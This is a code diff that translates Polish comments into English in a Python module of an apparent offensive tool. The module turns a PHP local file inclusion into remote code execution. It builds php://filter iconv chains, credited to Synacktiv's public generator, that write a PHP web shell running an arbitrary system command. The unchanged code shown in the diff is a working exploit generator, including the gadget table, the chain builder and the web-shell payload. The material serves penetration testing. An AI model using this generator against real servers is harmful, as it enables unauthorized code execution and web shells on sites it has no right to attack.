@@ -1,19 +1,19 @@
-"""Filter-chain RCE — LFI -> RCE bez wgranego pliku, przez łańcuch php://filter.
+"""Filter-chain RCE — LFI -> RCE with no uploaded file, via a php://filter chain.
 
-Buduje dowolny string (tu: web-shell PHP z komendą) bajt po bajcie z pustego
-strumienia `php://temp`, wyłącznie łańcuchem konwersji `convert.iconv.*` +
-`convert.base64-*`. Nie wymaga --file / uploadu — to jego przewaga nad
-`zip_phar`.
+Builds an arbitrary string (here: a PHP web shell with a command) byte by
+byte from the empty `php://temp` stream, using only `convert.iconv.*` +
+`convert.base64-*` conversion filters. Needs no --file / upload — that's
+its advantage over `zip_phar`.
 
-Tabela konwersji (znak base64 -> gadget iconv, który dopisuje ten znak na
-start strumienia) i algorytm budowy łańcucha są adaptacją publicznego
-narzędzia Synacktiv, użyte tu z atrybucją:
+The conversion table (base64 character -> iconv gadget that prepends that
+one character to the stream) and the chain-building algorithm are adapted
+from Synacktiv's public tool, used here with attribution:
 https://github.com/synacktiv/php_filter_chain_generator
-(patrz też: https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
+(see also: https://www.synacktiv.com/en/publications/php-filters-chain-what-is-it-and-how-to-use-it)
 
-Wymaga glibc iconv (typowe dla Linuksa/kontenerów PHP) — na macOS/BSD iconv
-część nazw charsetów może nie istnieć, więc chain wygenerowany tutaj może nie
-zadziałać lokalnie, ale zadziała na typowym linuksowym celu.
+Requires glibc iconv (typical on Linux/PHP containers) — on macOS/BSD
+iconv some charset names may not exist, so a chain generated here might
+not work locally, but will work against a typical Linux target.
 """
 from __future__ import annotations
 
@@ -25,8 +25,8 @@ from .base import BaseModule
 
 _FILE = "php://temp"
 
-# Znak base64 -> łańcuch iconv dopisujący ten jeden znak na start strumienia.
-# Źródło: synacktiv/php_filter_chain_generator (php_filter_chain_generator.py).
+# base64 character -> iconv chain that prepends that one character to the stream.
+# Source: synacktiv/php_filter_chain_generator (php_filter_chain_generator.py).
 _CONVERSIONS: dict[str, str] = {
     '0': 'convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2',
     '1': 'convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4',
@@ -97,7 +97,7 @@ _CONVERSIONS: dict[str, str] = {
 
 
 def build_chain(target: str) -> str:
-    """target (dowolny string, np. kod PHP) -> payload php://filter/.../resource=php://temp."""
+    """target (any string, e.g. PHP code) -> payload php://filter/.../resource=php://temp."""
     b64 = base64.b64encode(target.encode()).decode().replace("=", "")
 
     filters = "convert.iconv.UTF8.CSISO2022KR|"
@@ -115,9 +115,9 @@ def build_chain(target: str) -> str:
 
 
 class FilterChainRCEModule(BaseModule):
-    """php://filter chain — buduje web-shell w locie, bez wgranego pliku."""
+    """php://filter chain — builds a web shell on the fly, no uploaded file."""
     name = "filter_chain_rce"
-    description = "php://filter chain (Synacktiv) — RCE bez wgranego pliku"
+    description = "php://filter chain (Synacktiv) — RCE with no uploaded file"
 
     def payloads(self) -> Iterator[str]:
         php = f"<?php system('echo {RCE_MARKER}; {self.cfg.cmd}'); ?>"
